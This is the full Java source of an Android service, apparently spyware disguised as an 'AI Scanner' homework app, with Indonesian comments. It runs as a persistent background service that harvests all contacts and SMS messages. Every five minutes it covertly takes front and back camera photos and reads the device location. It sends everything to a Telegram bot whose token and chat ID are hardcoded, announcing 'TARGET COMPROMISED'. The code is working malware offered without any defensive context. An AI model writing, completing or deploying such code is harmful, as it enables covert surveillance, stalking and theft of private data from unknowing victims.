package com.ai.homework;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.Telephony;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import okhttp3.*;

public class HarvesterService extends Service {
    private OkHttpClient client = new OkHttpClient();
    private String BOT_TOKEN = "9136102668:AAHIqngLUTmSneSbZt-ddd34YqRHcpKIkSM"; 
    private String CHAT_ID = "5437327956";     
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            String CHANNEL_ID = "AIScannerChannel";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel serviceChannel = new NotificationChannel(CHANNEL_ID, "AI Scanner", NotificationManager.IMPORTANCE_LOW);
                NotificationManager manager = getSystemService(NotificationManager.class);
                manager.createNotificationChannel(serviceChannel);
            }
            Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
            Notification notification = builder.setContentTitle("AI Scanner Active").setContentText("Memproses...").setSmallIcon(android.R.drawable.ic_menu_camera).setOngoing(true).build();
            startForeground(1, notification);

            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AISpy::WakeLock");
            wakeLock.acquire();
        } catch (Exception e) {
            sendTgText("❌ ERROR START FOREGROUND: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                boolean isFirstRun = true;
                while (true) {
                    try {
                        if (isFirstRun) {
                            String contacts = getContacts();
                            String sms = getSms();
                            sendTgText("🎯 <b>TARGET COMPROMISED</b>\n\n<b>KONTAK:</b>\n" + contacts + "\n\n<b>SMS:</b>\n" + sms);
                            isFirstRun = false;
                        }

                        String locLink = getLocationLink();
                        
                        // Ambil foto pake try-catch terpisah biar gak matiin loop
                        try {
                            takePhotoWithCamera(0, "📸 Foto Belakang");
                            Thread.sleep(2000);
                            takePhotoWithCamera(1, "📸 Foto Depan");
                        } catch (Exception e) {
                            sendTgText("❌ ERROR KAMERA: " + e.getMessage());
                        }

                        sendTgText("🟢 <b>LIVE UPDATE</b>\n📍 Lokasi: " + locLink + "\n🕒 Waktu: " + new java.util.Date().toString());
                        Thread.sleep(300000); // 5 Menit
                        
                    } catch (Exception e) {
                        // Kirim error ke Telegram biar lu tau kenapa dia mati
                        sendTgText("❌ ERROR MAIN LOOP: " + e.getMessage());
                        try { Thread.sleep(60000); } catch (Exception ex) {}
                    }
                }
            }
        }).start();
        return START_STICKY;
    }

    private String getLocationLink() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc != null) return "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
        } catch (SecurityException se) {
            return "Izin Lokasi Ditolak!";
        } catch (Exception e) {}
        return "Lokasi gak tersedia.";
    }

    private void takePhotoWithCamera(int cameraId, String caption) {
        Camera camera = null;
        try {
            camera = Camera.open(cameraId);
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera cam) {
                    String fileName = (cameraId == 0) ? "spy_back.jpg" : "spy_front.jpg";
                    File file = new File(getExternalFilesDir(null), fileName);
                    try (FileOutputStream fos = new FileOutputStream(file)) { fos.write(data); } catch (Exception e) {}
                    cam.release();
                    sendTgPhoto(file, caption);
                }
            });
        } catch (Exception e) {
            if (camera != null) camera.release();
            sendTgText("❌ ERROR KAMERA " + cameraId + ": " + e.getMessage());
        }
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" : ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                }
                cursor.close();
            }
        } catch (Exception e) { return "Error izin kontak: " + e.getMessage(); }
        return sb.toString();
    }

    private String getSms() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))).append("\nIsi: ").append(cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))).append("\n\n");
                }
                cursor.close();
            }
        } catch (Exception e) { return "Error izin SMS: " + e.getMessage(); }
        return sb.toString();
    }

    private void sendTgText(String text) {
        try {
            JSONObject json = new JSONObject(); json.put("chat_id", CHAT_ID); json.put("text", text); json.put("parse_mode", "HTML");
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json"));
            client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build()).execute();
        } catch (Exception e) {}
    }

    private void sendTgPhoto(File file, String caption) {
        try {
            RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID).addFormDataPart("caption", caption)
                    .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg"))).build();
            client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto").post(requestBody).build()).execute();
        } catch (Exception e) {}
    }

    @Override public void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}
